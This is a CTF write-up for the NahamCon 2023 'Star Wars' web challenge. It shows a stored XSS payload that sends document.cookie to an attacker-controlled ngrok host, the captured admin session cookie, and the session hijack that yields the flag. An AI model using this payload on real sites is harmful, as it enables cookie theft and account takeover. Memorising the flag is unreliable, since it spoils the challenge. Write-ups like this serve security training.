---
CTF: Nahamcon 2023
Challenge Name: Star Wars
Category: Web
Date: 15/06/23
Author: congon4tor
Points: 50
Solves: 329
---
[![Nahamcon CTF 2023: Star Wars (Web)](https://img.youtube.com/vi/XHg_sBD0-es/0.jpg)](https://www.youtube.com/watch?v=XHg_sBD0-es?t=18 "Nahamcon CTF 2023: Star Wars (Web)")

### Description
>If you love Star Wars as much as I do you need to check out this blog!

## Solution
Can't create an account or sign up as admin.

Register as `cat` and find a guestbook, provide XSS payload to steal cookie.
```html
<script>new Image().src='http://ATTACKER_SERVER.ngrok-free.app?c='+document.cookie</script>
```

Request is made to our server containing cookies, including a [JWT](https://youtu.be/GIq3naOLrTg)
```bash
127.0.0.1 - - [15/Jun/2023 23:09:24] "GET /?c=ss_cvr=3ad69c49-d9aa-4fb0-b6f1-5c38324adf3b|1686862282337|1686862282337|1686862282337|1;%20x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE HTTP/1.1" 200 -
```

We replace the session cookie with `eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE` and receive a flag!
```txt
flag{a538c88890d45a382e44dfd00296a99b}
```